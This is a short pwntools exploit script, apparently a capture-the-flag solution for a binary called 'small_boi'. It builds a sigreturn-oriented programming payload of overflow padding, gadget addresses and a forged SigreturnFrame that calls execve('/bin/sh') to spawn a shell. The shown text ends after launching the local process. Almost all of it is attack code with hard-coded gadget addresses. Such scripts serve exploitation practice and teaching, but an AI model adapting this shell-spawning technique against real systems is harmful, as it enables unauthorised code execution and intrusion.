from pwn import *

context.arch = 'amd64'
pop_rax = 0x000000000040018a
bin_sh_str = 0x004001ca
push_val_xchg_eax_edi_shr_edx_ret_val = 0x000000000040016c
execve_syscall = 0x3B
syscall = 0x0000000000400185

frame = SigreturnFrame()
frame.rax = 59 # syscall for execve
frame.rdi = bin_sh_str
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0xdeadbeef
frame.rip = syscall

# payload = cyclic(40) + p64(pop_rax) + p64(bin_sh_str) + p64(push_val_xchg_eax_edi_shr_edx_ret_val) + p64(execve_syscall)
alt_payload = cyclic(40) + p64(pop_rax) + p64(0x0f) + p64(syscall) + bytes(frame)

p = process('./small_boi')